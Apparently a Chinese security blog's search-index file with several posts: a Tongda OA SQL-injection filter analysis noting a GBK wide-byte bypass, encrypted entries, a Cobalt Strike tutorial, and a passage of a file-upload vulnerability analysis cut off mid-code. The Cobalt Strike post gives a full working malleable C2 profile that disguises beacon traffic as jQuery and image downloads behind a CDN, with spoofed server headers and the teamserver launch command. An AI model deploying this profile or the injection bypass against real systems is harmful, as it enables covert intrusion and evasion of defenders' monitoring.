<span class="keyword">return</span> <span class="variable">$db_string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2013adv的使用了<code>sql_injection</code>函数进行防注处理（过滤了<code>updatexml</code>、<code>into outfile</code>、<code>extractvalue</code>、<code>ascii</code>、<code>ord</code>、<code>cast</code>、<code>sleep</code>、<code>benchmark</code>、<code>load_file</code>、<code>union</code>关键字）</p><h2 id="2015-2016"><a href="#2015-2016" class="headerlink" title="2015~2016"></a>2015~2016</h2><p>这两个版本没什么变化，2015相对2013adv新增<code>exp</code>黑名单</p><h2 id="2017"><a href="#2017" class="headerlink" title="2017"></a>2017</h2><p>2017相对2016新增处理<code>&amp;#160;</code>，查表后是对应的ascii是空格</p><p><img src="/images/image-20200723110633783.png" alt="image-20200723110633783"></p><h2 id="V11"><a href="#V11" class="headerlink" title="V11"></a>V11</h2><p>与2017相同，不放代码了</p><h1 id="td-framework数据库查询处理流程"><a href="#td-framework数据库查询处理流程" class="headerlink" title="td_framework数据库查询处理流程"></a>td_framework数据库查询处理流程</h1><p>通达的<code>td_framework</code>框架（可能看的不是太清，建议新开标签页查看）</p><p><img src="/images/%E6%9C%AA%E5%91%BD%E5%90%8D%E8%A1%A8%E5%8D%95.png" alt="未命名表单"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>由于数据库是GBK编码（2013~V11都是），虽然使用了<code>addslashes</code>函数进行处理引号等字符，但是可使用宽字节<code>%df%27</code>进行绕过。通达OA这个产品由于架构比较老导致问题比较多，考虑到市场份额和影响，不放用于攻击的EXP。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通达OA 2013-2019（V11.X）前台多处注入点</title>
      <link href="/p/3504.html"/>
      <url>/p/3504.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="adb64528799ced344246eabaeaab20f0aaa6d0dc7be4c155e320cb80315b1c13">f6ae6e37cafa8b635e173b811b985f64cc4dc9d53b5e11c39587f78adc381a31db73c6dbba5d5a7c259f9a980eafd97d4dfe18c81555417cbbf70c5f3657ea8c7e189c96475afc18ca05d6405e0e335a463aad7e770fc9e51bcfe996bee94b8259008eb5b9bba38e566a75f8e0caf04adeb9f31f1993cb2924183c17241aa5fc403703f125504a25a6521ff8fffd49dee1e09bc703bf84f0845c8be7938b9f4761acf8b55189aac692aa04e97aa7c460293067faac7fb4827a197206aec814c73f13fb9903d7e24593482e7385702b723acca845431fb48155ca62bebdfb687030b37ad6cc207a0d2c457e749f5022c2bd7c039121228cdf36a53881e3764fc788f292af2f585296c3e8d27bfccfe6f3d192d64c300197db90c16277ce0996eae9f0d644a7dd992a6dccb822824a47df7f82f476a72fdce80c7678d2a2522b4530cba615694072f4dca8259319726e195b82436ae9bf61ad1edaeb7f36473e9176fea1a18ddd4432e80903342ba0cc6f5a1f52b0c43d6aa64295984dfc5a8949b32436af13ebb0cecd546beda9a760a8cc4afb31a31e24c70c9c600907bb7c4b72dd9b617e45665a9c4295d5e9f3f5782ac9cd24453feb397a92c0b55d693891e1ff2df20ad796004ba341f9d16f43ca53a2e272a0d3887039da9a87f83fa00be2b72350da62fe5ee5cd45f9141f7e7fafb5f491663f776a69a5c3e465b7054aa16ff493169b1745f55fc7f323f9f0ddfefcf5c24a4cc0a5b52fb2d956dc527698b4748989d9247ee0019fab5bb191b70421d7233c4e2aee609b821254ff96f084b40ac39ae524565f97e0f142dc1911e916c5160bd886232238ab965438467f20d4e6df4de5e5fc2b2dfd437fed8c74da68d948fb4ef5d3b61f4643876bd6f3f20c575d1971fee27db098a3fb596f72e4d72336d457d1398d3852cfd29aaf3f6e167605b724f613281c6167925baeadf827fff3a12c404c6b1760309da5a90bb979b26e8b50b3d8c811d280dba19d1b1f6605639ddb955aeea3d79389bde056d7fef7d6a4747ca2b4280bed8d8ec9f1694ce7a6f8a1780a5af256d5b4821a36dee8c880a38d144243e5fd2811b95b9a7151c3a43804669949711afc08f8846c8f98a19d3f8b471d9d832ac73cf6c124d1bcee4831e7c1b6cba644a3a16b9ed23e5aef15867b01a071019cf67d95b63946809b02a40b11f28591fc6f6808a6e0535c716e6650c51bae735333e49a75dded0bd6fa16dc88691292061618d28ab29bf514b2706e8dca730d9c5a5a8f03ba6805bcf1f534d8c1ae8df155a4140ce9d842a67c8bc07f34453147ce1687a016122b3185105cd5e4a727998d4a6f561103fb2658dd973857fd84c3b4d6e2244075a0b12593b9a85c2ac2fb7e8523e6260565f7a5c3d88cbcbd0c15ef6be0d44c1a651f999f9f1a1821199e4cbcbce8306e1ca7f455a86da6638a34eb8e26efba130ce5a346afb1f84dda67531e7de49e332c09e3ecfe47a520bc89e734dae809c083bfa226916ea2a3d1584aabe3a544e96ac49d4951dad260cf19755d2d33d1fbb24c745578df683c32885f465ec40ab8d92280021a2a036ecd7977ed5fba621c6971feeb306ebec95ae415ebc30d675cae9130b2dfde5cb747253ac2d404eaa28a9e45717baf679ccdedb506861dd94a3af43493f34f40680efc2c248ffc12891f0a08ec9d763f9e8ebf17f51e703d783fa14bb86409717cabe9d3eee1d730e4cf2419e391541f906cf6fd93d99c679e15cfe10eedfd6b8b527fc2bef443c5a3eec9b53aad8a574b9a945dca2f934c36678865bb52cf8e92475c97444afabf1da70ddc3395f4f8bbb6894777101a63680cb403745dac7090df8e9440e7f774b2c8203110ebd12b6f6536313f46d2bd771213dbb7623fcb9eab78c7a05896dc641c4e3bb15087175464d4a95c92394010eb7715ef06ce43b78ac249c78b9063d24b5afa418aa09721cb830c80d0f3f66919350868a5a154b55047742f929da410c08eb0b3e42780e6b6384901d23b0d54145066e0ca435796dd38746db5863cf38e9d94f2c9103bc90fe6e236a63d31f28cbdb300a5a4d63d804350a54400fad225acb4643b3bc2374de1df36f788ded10f05c14d63533ee16494b1aec45c8bf46db5e3a3ff03bf54d767ab9a0e7e177b88706140bcf4d9f5f3ec109c865035821dca004080d8b9a89b2e0696170ea200b29ac1f03acfffb9a26bc91171ce276b409f1940476b9c80bee405efdc13254bcfdf12ad652fa71da8fb3933e9bffd9ea70c8834407363113ad6de54a078da27f1f8406b6bc1c1283117b890dc8604e22b8898693422ef773c754e8c81694e40441ccfe9235d89ca4d2ea2fc0598921634226d2fb93cd326778688d47774597f3609f1fbcb24331bf2f7d38b4f6593b3f91b26e6b7ff90f07a9d05cf375659bc3090981843d835c7c6836d39eab4e58a40ade29fc48bf2ea0a1b2f4542ac29cbfe4a158ffe6ef6b5600d974046ccab6592102e4ceb130adba94cc1d41af2a5a40ef9c5789827bab33e82444c94c9b11aea4514a880b8570c284d2d45f9e111a54fec9b93f3373c9da1d488086e009208023fa02711223b408bee0f99f451f84733ad83a2e56af076f8dae44adf7bfdadcbf955e32b3d144b1733b08a3a2b7127ad09d2a1544b18007998e9571ca0b4c477f7f63508be83226eabd5d737d04e2ddf61c9dd94a15c8c882863f16c573ec4256e6ec1aa1a32d7585dc527768e24b968b209b6cf58242ec98af5814dcd456aef37ae89f5b98efdec72e4ab34b6f36a4add95d3ccb3d5dc84e047a08008c9796c9990d8637e2248b1f2878c49cd043e68e9a47502a62610b9e2dadc4b380b430e75507822a6763c29a01273d8d2bf24b9f2e7491e65933e43f09b87d3a8965aa5346513d00207cdc145bbdb06f1cf6e68cd342f0bb726e7ac867a95b91df67b7ab077d82686317e831817fd84a68cdd5171900be5ac1582aa5d2c3d3dc69c9884d91a3c41c8c166b7d526176dacea6d9ac48078bb618dc46b9a8b6abe70a570a8e771e6a9dacd56524bb250fa2ad346a63d2e303a3c52ff6ee51ddf101e93d6552879113133df25ebcd86e000ad629370eedf062a3b561f6782f945a4fd5b54ab54b6ab1d775a6a2f2d3345308eb16685e8ae62af4f0c743086dceae72672231e6ea8615a2e385ca5ae9302cb2841f8f338fae71d87e6e141069eb22a9e7378fa44c44527d4c1fa1efd38470bc87be5ca19d5bd60d82bc2c7d3ac39f040788ec8d4bca55c161c50d40c456648efe58aff33dd2ece9f00287d743bb9e0953920ea155946ce80cda901722083f3b806a2f72aa26d4ca201cedc1bf592e4e8604b7e0f3c27ba5b048f1ba264807115759c266460468122e3a19cd1952b23e051b0060b1656e8bb16c2da93d7109af3e22e65b7f62945afa2b964f9aa404d0b816c4a10bb976e12f363418e8b18575f88</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> codeReview </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS通过CDN上线</title>
      <link href="/p/8dee.html"/>
      <url>/p/8dee.html</url>
      
        <content type="html"><![CDATA[<p>学习下CS通过CDN上线</p><span id="more"></span><h1 id="所需"><a href="#所需" class="headerlink" title="所需"></a>所需</h1><blockquote><p>域名*1</p><p>CDN*1</p><p>VPS*1</p></blockquote><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>域名购买后将DNS更改为CDN服务商的DNS服务器，然后等待生效</p><p>以CF为例，生效后会给邮箱发一封邮件</p><p><img src="/images/image-20200715153342479.png" alt="image-20200715153342479"></p><p>然后配置解析域名</p><p><img src="/images/image-20200715153459667.png" alt="image-20200715153459667"></p><p>CS配置文件 <strong>C2.profile</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment">##</span></span></span><br><span class="line"><span class="meta"> # </span><span class="language-bash">@Author         : Sp4ce</span></span><br><span class="line"><span class="meta"> # </span><span class="language-bash">@Date           : 2020-07-15 11:59:42</span></span><br><span class="line"><span class="meta"> # </span><span class="language-bash">@LastEditors    : Sp4ce</span></span><br><span class="line"><span class="meta"> # </span><span class="language-bash">@LastEditTime   : 2020-07-15 15:14:57</span></span><br><span class="line"><span class="meta"> # </span><span class="language-bash">@Description    : Challenge Everything.</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment">##</span></span> </span><br><span class="line">set sample_name &quot;Etumbot&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;2000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;/image/&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;CS上线域名&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;http://www.google.com&quot;;</span><br><span class="line">        header &quot;Pragma&quot; &quot;no-cache&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;no-cache&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            append &quot;-.jpg&quot;;</span><br><span class="line">            uri-append;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;img/jpg&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;nginx/1.10.3 (Ubuntu)&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https-certificate &#123;</span><br><span class="line">    </span><br><span class="line">    ## Option 1) Trusted and Signed Certificate</span><br><span class="line">    ## Use keytool to create a Java Keystore file. </span><br><span class="line">    ## Refer to https://www.cobaltstrike.com/help-malleable-c2#validssl</span><br><span class="line">    ## or https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh</span><br><span class="line">    ## Option 2) Create your own Self-Signed Certificate</span><br><span class="line">    ## Use keytool to import your own self signed certificates</span><br><span class="line"></span><br><span class="line">    set keystore &quot;./spoofdomain.store&quot;;</span><br><span class="line">    set password &quot;mypass&quot;;</span><br><span class="line"></span><br><span class="line">    ## Option 3) Cobalt Strike Self-Signed Certificate</span><br><span class="line">    set C   &quot;US&quot;;</span><br><span class="line">    set CN  &quot;jquery.com&quot;;</span><br><span class="line">    set O   &quot;jQuery&quot;;</span><br><span class="line">    set OU  &quot;Certificate Authority&quot;;</span><br><span class="line">    set validity &quot;365&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    set uri_x86 &quot;/jquery-3.3.1.slim.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;/jquery-3.3.2.slim.min.js&quot;;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Server&quot; &quot;NetDNA-cache/2.2&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;max-age=0, no-cache&quot;;</span><br><span class="line">        header &quot;Pragma&quot; &quot;no-cache&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application/javascript; charset=utf-8&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)</span><br><span class="line">            # 2nd Line            </span><br><span class="line">            prepend &quot;!function(e,t)&#123;\&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;;</span><br><span class="line">            # 1st Line</span><br><span class="line">            prepend &quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;;</span><br><span class="line">            append &quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en-US,en;q=0.5&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;CS上线域名&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;http://code.jquery.com/&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;/history/&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;CS上线域名&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;http://www.google.com&quot;;</span><br><span class="line">        header &quot;Pragma&quot; &quot;no-cache&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;no-cache&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            netbiosu;</span><br><span class="line">            append &quot;.asp&quot;;</span><br><span class="line">            uri-append;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;img/jpg&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS/10.0&quot;;</span><br><span class="line">        header &quot;X-Powered-By&quot; &quot;ASP.NET&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-config &#123;</span><br><span class="line">    set trust_x_forwarded_for &quot;true&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>C2.profile传到C2服务器上，与CS文件同级目录，命令启动<code>./teamserver C2IP C2PASS ./c2.profile</code></p><p>然后攻击机新建监听器，配置如下</p><p><img src="/images/image-20200715154002213.png" alt="image-20200715154002213"></p><p>上线测试</p><p><img src="/images/image-20200715154104473.png" alt="image-20200715154104473"></p><p>远端地址均为CDN IP</p><h1 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h1><p>CDN需要关闭缓存或开启开发模式</p><p><img src="/images/M394ITIR7RXRU4CBFAV%5D8DV.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透实战</title>
      <link href="/p/1dad.html"/>
      <url>/p/1dad.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="8bfabe90cc12a949924b0c571cd4a70622cb75cbe12854123926974febf7b5eb"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通达OA任意文件上传+任意文件包含分析</title>
      <link href="/p/7f23.html"/>
      <url>/p/7f23.html</url>
      
        <content type="html"><![CDATA[<p>通达OA官方于2020-03-13发布了安全更新，修复了任意文件上传（2013、2013adv、2015、2016、2017、V11）和文件包含（V11）漏洞，从官网下到源码解密后，简单看了下</p><span id="more"></span><p>直接看主流的2017、V11产品吧，这个系列产品有全版本的变量覆盖问题</p><h1 id="V11、2017任意上传"><a href="#V11、2017任意上传" class="headerlink" title="V11、2017任意上传"></a>V11、2017任意上传</h1><p>以2017为例</p><p>补丁文件路径：<code>2020_A1\2017版\ispirit\im\upload.php</code></p><p>左侧为原始代码，右侧为补丁，可以看到直接将鉴权的文件从<code>else</code>里释放了出来，避免了第5行传入<code>P</code>值导致的权限绕过问题</p><p><img src="/images/image-20200320233755927.png" alt="image-20200320233755927"></p><p>继续往下看任意文件上传的问题</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$TYPE</span> = <span class="variable">$_POST</span>[<span class="string">&quot;TYPE&quot;</span>];<span class="comment">//获取TYPE</span></span><br><span class="line"><span class="variable">$DEST_UID</span> = <span class="variable">$_POST</span>[<span class="string">&quot;DEST_UID&quot;</span>];<span class="comment">//获取DEST_UID（接收方ID）</span></span><br><span class="line"><span class="variable">$dataBack</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$DEST_UID</span> != <span class="string">&quot;&quot;</span>) &amp;&amp; !<span class="title function_ invoke__">td_verify_ids</span>(<span class="variable">$ids</span>)) &#123;</span><br><span class="line"><span class="variable">$dataBack</span> = <span class="keyword">array</span>(<span class="string">&quot;status&quot;</span> =&gt; <span class="number">0</span>, <span class="string">&quot;content&quot;</span> =&gt; <span class="string">&quot;-ERR &quot;</span> . <span class="title function_ invoke__">_</span>(<span class="string">&quot;接收方ID无效&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="title function_ invoke__">data2utf8</span>(<span class="variable">$dataBack</span>));</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里进行了判断是否为空并调用了<code>td_verify_ids</code>函数进行校验</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//td_verify_ids</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">td_verify_ids</span>(<span class="params"><span class="variable">$ids</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> !<span class="title 